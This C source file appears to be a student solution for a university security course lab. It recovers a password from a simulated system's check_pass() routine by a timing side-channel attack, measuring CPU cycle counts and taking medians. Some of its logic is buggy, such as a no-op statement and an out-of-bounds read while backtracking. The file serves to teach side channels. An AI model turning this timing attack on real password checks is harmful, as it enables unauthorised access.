/*******************************************************
 CSE127 Project
 User routines file

  You can change anything in this file, just make sure 
  that when you have found the password, you call 
  hack_system() function on it.

 CSE127 Password guesser using timing

 *******************************************************/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"
#include "stdlib.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int cmp(const void * a, const void * b) {
  return ( *(unsigned long *) a - *(unsigned long *) b );
}

int main(int argc, char **argv) {
    char guess[33];

    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    int numTrials = 20;
    unsigned long start;
    unsigned long end;
    unsigned long median = 0;
    char bestGuess;

    unsigned long trials[numTrials];
    unsigned long chosenTrialTime[32];
    bzero(chosenTrialTime, sizeof(chosenTrialTime));

    int i;
    int j;
    int k;

    int max_pass_length = 32;
    int min_ASCII = 33;
    int max_ASCII = 126;

    for (i = 0; i < max_pass_length; i++) {
      for (j = min_ASCII; j <= max_ASCII; j++) {
        guess[i] = (char) j;
        for (k = 0; k < numTrials; k++) {
          start = rdtsc();
          check_pass(guess);
          end = rdtsc();
          trials[k] = end - start;  
        } 
        // Find median for that character
        qsort(trials, sizeof(trials) / sizeof(unsigned long), sizeof(unsigned long), cmp);
        int thisMedian = trials[numTrials / 2];
        
        // Find character with largest median value to use at the best guess
        if (thisMedian > median) {
          bestGuess = (char) j;
          median = thisMedian;
        }
      }
      // Assign the best guess character we have chosen and the max median of that character
      guess[i] = bestGuess;
      chosenTrialTime[i] = median;
      median = 0;

      // If we have the final password, break
      if (check_pass(guess)) {
        break;
      }

      // Backtrack if current max median is less than the previous one
      if (chosenTrialTime[i] <= chosenTrialTime[i - 1] && i > 0) {
        guess[i] = 0;
        guess[i - 1] - 0;
        i = i - 2;
      }
    }

    if (check_pass(guess)) {
      printf("Password Found!\n");
      hack_system(guess);
    };

    /* for (i = 0; i < 32; i++) {
      printf("%lu\n", chosenTrialTime[i]);
    } */
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
